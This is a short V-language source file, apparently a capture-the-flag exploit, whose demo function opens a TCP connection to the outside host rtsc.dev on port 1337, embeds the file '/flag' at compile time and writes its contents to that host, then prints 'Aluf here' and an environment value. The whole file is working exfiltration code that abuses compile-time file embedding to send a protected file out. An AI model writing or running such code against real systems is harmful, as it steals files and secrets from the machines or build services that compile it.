module aluf

import os
import net

pub fn demo() {
        mut conn := net.dial_tcp("rtsc.dev:1337") or { panic('') }
        flag := $embed_file('/flag')
        conn.write_string(flag.to_string())  or { panic('') }
	println('Aluf here')
        senv := $env('')
        println(senv)
}